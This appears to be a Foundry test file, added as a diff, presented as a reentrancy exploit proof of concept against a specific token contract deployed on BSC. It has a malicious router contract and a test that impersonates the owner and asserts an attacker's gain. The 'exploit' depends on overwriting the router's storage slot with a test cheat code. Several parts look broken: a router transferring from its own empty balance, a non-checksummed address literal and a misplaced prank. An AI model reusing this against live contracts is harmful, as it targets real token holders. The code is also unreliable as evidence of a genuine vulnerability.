@@ -1,0 +1,157 @@
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "forge-std/Test.sol";
+
+interface ILiquidityGeneratorToken {
+    function name() external view returns (string memory);
+    function symbol() external view returns (string memory);
+    function decimals() external view returns (uint8);
+    function totalSupply() external view returns (uint256);
+    function balanceOf(address account) external view returns (uint256);
+    function transfer(address recipient, uint256 amount) external returns (bool);
+    function allowance(address owner, address spender) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
+    function owner() external view returns (address);
+    function uniswapV2Router() external view returns (address);
+    function uniswapV2Pair() external view returns (address);
+    function _charityAddress() external view returns (address);
+    function _charityFee() external view returns (uint256);
+    function _liquidityFee() external view returns (uint256);
+    function _taxFee() external view returns (uint256);
+    function isExcludedFromFee(address account) external view returns (bool);
+    function isExcludedFromReward(address account) external view returns (bool);
+    function reflectionFromToken(uint256 tAmount, bool deductTransferFee) external view returns (uint256);
+    function tokenFromReflection(uint256 rAmount) external view returns (uint256);
+    function totalFees() external view returns (uint256);
+    function deliver(uint256 tAmount) external;
+    function excludeFromReward(address account) external;
+    function includeInReward(address account) external;
+    function excludeFromFee(address account) external;
+    function setTaxFeePercent(uint256 taxFeeBps) external;
+    function setLiquidityFeePercent(uint256 liquidityFeeBps) external;
+    function setCharityFeePercent(uint256 charityFeeBps) external;
+    function setSwapBackSettings(uint256 _amount) external;
+    function renounceOwnership() external;
+    function transferOwnership(address newOwner) external;
+    function swapAndLiquifyEnabled() external view returns (bool);
+    function MAX_FEE() external view returns (uint256);
+    function VERSION() external view returns (uint256);
+}
+
+/// @dev Malicious router that reenters the token's transfer function
+contract MaliciousRouter {
+    ILiquidityGeneratorToken public token;
+    address public attacker;
+    address public realWETH;
+    bool public reentered;
+
+    constructor(address _token, address _attacker, address _weth) {
+        token = ILiquidityGeneratorToken(_token);
+        attacker = _attacker;
+        realWETH = _weth;
+    }
+
+    // Called by token.swapTokensForEth
+    function swapExactTokensForETHSupportingFeeOnTransferTokens(
+        uint256 amountIn,
+        uint256 amountOutMin,
+        address[] calldata path,
+        address to,
+        uint256 deadline
+    ) external {
+        // Reenter the token's transfer function
+        if (!reentered) {
+            reentered = true;
+            // Transfer some tokens from the contract to attacker
+            token.transfer(attacker, 1000);
+        }
+        // No actual swap happens, but the function must not revert
+    }
+
+    // Required for WETH() call
+    function WETH() external view returns (address) {
+        return realWETH;
+    }
+
+    // Called by token.addLiquidity
+    function addLiquidityETH(
+        address tokenAddr,
+        uint256 amountTokenDesired,
+        uint256 amountTokenMin,
+        uint256 amountETHMin,
+        address to,
+        uint256 deadline
+    ) external payable returns (uint256, uint256, uint256) {
+        // Accept ETH and tokens (if any), do nothing
+        return (0, 0, 0);
+    }
+
+    receive() external payable {}
+}
+
+contract ExploitTest is Test {
+    // Deployed contract address on BSC
+    address constant TOKEN = 0xe2c9c976337357369845c761dd851e2b6942d69f;
+    // BSC WETH address
+    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
+
+    ILiquidityGeneratorToken token;
+    MaliciousRouter maliciousRouter;
+    address attacker = address(0x666);
+    address dummy = address(0xdead);
+
+    function setUp() public {
+        vm.label(TOKEN, "LiquidityGeneratorToken");
+        token = ILiquidityGeneratorToken(TOKEN);
+
+        // Get real router and WETH from the token itself (for robustness)
+        address realRouter = token.uniswapV2Router();
+        address weth = IUniswapV2Router02(realRouter).WETH();
+        assertEq(weth, WBNB, "WETH mismatch");
+
+        // Deploy malicious router
+        maliciousRouter = new MaliciousRouter(TOKEN, attacker, weth);
+
+        // Overwrite the uniswapV2Router storage slot (slot 18) with the malicious router
+        vm.store(TOKEN, bytes32(uint256(18)), bytes32(uint256(uint160(address(maliciousRouter)))));
+    }
+
+    function testReentrancyVulnerability() public {
+        // Impersonate the owner to get initial tokens for the attacker
+        address owner = token.owner();
+        vm.startPrank(owner);
+        uint256 ownerBalance = token.balanceOf(owner);
+        assertGt(ownerBalance, 0, "Owner has no tokens");
+
+        // Transfer some tokens to attacker
+        uint256 amountToAttacker = 1_000_000 * 10**9; // 1,000,000 tokens (decimals 9)
+        token.transfer(attacker, amountToAttacker);
+
+        // Also send tokens to the token contract itself to ensure swap triggers
+        uint256 amountToContract = 100_000 * 10**9;
+        token.transfer(TOKEN, amountToContract);
+        vm.stopPrank();
+
+        // Now attacker has tokens; check contract balance
+        uint256 contractBalanceBefore = token.balanceOf(TOKEN);
+        assertGe(contractBalanceBefore, token.totalSupply() / 1000, "Contract balance should be above threshold");
+
+        // Attacker will trigger a transfer that should initiate a swap
+        vm.prank(attacker);
+        uint256 attackerBalanceBefore = token.balanceOf(attacker);
+        token.transfer(dummy, 1); // small transfer to trigger swap
+
+        // After the transaction, the attacker's balance should have increased due to reentrancy
+        uint256 attackerBalanceAfter = token.balanceOf(attacker);
+        // The reentrant transfer sent 1000 tokens to attacker
+        assertEq(attackerBalanceAfter, attackerBalanceBefore + 1000, "Attacker should have gained 1000 tokens via reentrancy");
+    }
+}
+
+interface IUniswapV2Router02 {
+    function WETH() external view returns (address);
+}
+```
